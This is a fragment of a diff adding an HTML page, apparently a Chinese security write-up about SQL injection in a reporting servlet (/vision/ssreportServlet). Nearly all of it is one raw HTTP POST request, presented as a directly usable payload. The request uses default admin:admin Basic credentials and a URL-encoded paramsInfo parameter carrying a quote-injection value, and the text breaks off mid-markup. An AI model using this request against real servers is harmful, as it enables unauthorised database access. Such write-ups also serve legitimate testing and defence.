+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="0x01-解码并修改数据包直接注入">0x01 解码并修改数据包直接注入</h4>
+<p>修改 paramsInfoEncode 为 paramsInfo，将 Encode 参数去掉（以下payload 可直接使用）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">vision</span><span class="o">/</span><span class="n">ssreportServlet</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">99.0</span><span class="o">.</span><span class="mf">7113.93</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="n">vision</span><span class="o">/</span><span class="n">openresource</span><span class="o">.</span><span class="n">jsp</span><span class="err">?</span><span class="n">iPad</span><span class="o">=</span><span class="bp">true</span><span class="o">&amp;</span><span class="n">refresh</span><span class="o">=</span><span class="bp">true</span><span class="o">&amp;</span><span class="n">showtoolbar</span><span class="o">=</span><span class="bp">false</span><span class="o">&amp;</span><span class="n">showPath</span><span class="o">=</span><span class="bp">false</span><span class="o">&amp;</span><span class="n">resid</span><span class="o">=</span><span class="n">I40281d81016a8bc28bc20231016aaee007b230ac</span><span class="o">&amp;</span><span class="n">_timestamp</span><span class="o">=</span><span class="mi">1610433924926</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">3282</span>
+</span></span><span class="line"><span class="cl"><span class="n">Authorization</span><span class="p">:</span> <span class="n">Basic</span> <span class="n">YWRtaW46YWRtaW4</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="p">:</span> <span class="n">FQPassword</span><span class="o">=</span><span class="p">;</span> <span class="n">JSESSIONID</span><span class="o">=</span><span class="mi">4</span><span class="n">BB550BF10C606619B753D3CE52CD3AB</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sheetIndex</span><span class="o">=</span><span class="mi">0</span><span class="o">&amp;</span><span class="n">resid</span><span class="o">=</span><span class="n">I40281d81016a8bc28bc20231016aaee007b230ac</span><span class="o">&amp;</span><span class="n">clientId</span><span class="o">=</span><span class="n">Iff8080810176f0c7f0c7544f0176f54eb72c1160</span><span class="o">&amp;</span><span class="n">refreshType</span><span class="o">=</span><span class="n">refresh</span><span class="o">&amp;</span><span class="n">paramsInfo</span><span class="o">=%</span><span class="mi">5</span><span class="n">B</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="mi">95</span><span class="o">%</span><span class="n">E4</span><span class="o">%</span><span class="n">BD</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="n">A7</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="mi">95</span><span class="o">%</span><span class="n">E4</span><span class="o">%</span><span class="n">BD</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="n">A7</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="mi">95</span><span class="o">%</span><span class="n">E4</span><span class="o">%</span><span class="n">BD</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">8</span><span class="n">D</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="n">A7</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="s1">&#39;11111</span><span class="si">%22%</span><span class="s1">2C</span><span class="si">%22d</span><span class="s1">isplayValue</span><span class="si">%22%</span><span class="s1">3A%22&#39;</span><span class="mi">11111</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">B1</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">BA</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="mi">84</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">B1</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">BA</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="mi">84</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">B1</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">BA</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="mi">84</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">displayValue</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="mi">81</span><span class="o">%</span><span class="n">E4</span><span class="o">%</span><span class="n">BB</span><span class="o">%</span><span class="n">BD</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="mi">81</span><span class="o">%</span><span class="n">E4</span><span class="o">%</span><span class="n">BB</span><span class="o">%</span><span class="n">BD</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="mi">81</span><span class="o">%</span><span class="n">E4</span><span class="o">%</span><span class="n">BB</span><span class="o">%</span><span class="n">BD</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22440000</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">displayValue</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">B9</span><span class="o">%</span><span class="n">BF</span><span class="o">%</span><span class="n">E4</span><span class="o">%</span><span class="n">B8</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">B8</span><span class="o">%</span><span class="mi">82</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">B8</span><span class="o">%</span><span class="mi">82</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">B0</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">B8</span><span class="o">%</span><span class="mi">82</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">displayValue</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">85</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">83</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">C</span><span class="o">%</span><span class="n">BA</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">E</span><span class="o">%</span><span class="n">BF</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">C</span><span class="o">%</span><span class="n">BA</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">E</span><span class="o">%</span><span class="n">BF</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">C</span><span class="o">%</span><span class="n">BA</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">E</span><span class="o">%</span><span class="n">BF</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">displayValue</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">85</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">83</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">A3</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">B5</span><span class="o">%</span><span class="mi">8</span><span class="n">B</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">C</span><span class="o">%</span><span class="n">BA</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="mi">84</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">displayValue</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.%</span><span class="n">E5</span><span class="o">%</span><span class="n">A1</span><span class="o">%</span><span class="n">AB</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">8</span><span class="n">A</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="n">B5</span><span class="o">%</span><span class="n">B7</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">A1</span><span class="o">%</span><span class="n">AB</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">8</span><span class="n">A</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="n">B5</span><span class="o">%</span><span class="n">B7</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">alias</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">A1</span><span class="o">%</span><span class="n">AB</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">8</span><span class="n">A</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E8</span><span class="o">%</span><span class="n">B5</span><span class="o">%</span><span class="n">B7</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">value</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">displayValue</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="n">D</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">7</span><span class="n">B</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="n">OutputParameter</span><span class="o">.</span><span class="n">I40281d81016a8bc28bc20231016aa0be219728b6</span><span class="o">.%</span><span class="n">E5</span><span class="o">%</span><span class="n">A1</span><span class="o">%</span><span class="n">AB</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">8</span><span class="n">A</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">AD</span><span class="o">%</span><span class="n">A2</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="n">C</span><span class="o">%</span><span class="mi">22</span><span class="n">name</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">A1</span><span class="o">%</span><span class="n">AB</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">8</span><span class="n">A</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B6</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">B4</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span 